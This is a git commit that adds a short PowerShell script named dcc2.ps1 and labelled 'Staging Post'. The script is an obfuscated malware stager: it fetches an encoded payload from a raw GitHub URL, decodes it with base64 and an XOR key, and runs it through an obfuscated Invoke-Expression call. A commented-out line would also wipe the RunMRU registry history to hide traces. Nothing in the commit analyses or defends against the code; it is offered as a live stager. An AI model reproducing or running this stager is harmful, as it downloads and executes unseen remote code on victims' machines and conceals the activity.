f27cef3269522f59397318cdc088531b34f617a3
Bongman1234 <164390870+Bongman1234@users.noreply.github.com>
2024-03-28 17:51:49 +0000

    Create dcc2.ps1

---
+++ dcc2.ps1
@@ -0,0 +1,19 @@
+# ====================== Staging Post =============================
+
+ function dojob {
+    param ([string]$sec,[string]$bty)
+    $ajd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($sec))
+    $asg = ""
+    for ($i = 0; $i -lt $ajd.Length; $i++) {
+        $osn = [int]$ajd[$i] -bxor [int]$bty[$i % $bty.Length]
+        $asg += [char]$osn
+    }
+    return $asg
+}
+$k = "https://pastebin.com/raw/sL1FM7x4"
+$t = irm "https://raw.githubusercontent.com/Bongman1234/assets/main/y6rhf4w"
+$isn = dojob -sec $t -bty $k
+
+# reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+$isn | i`ex
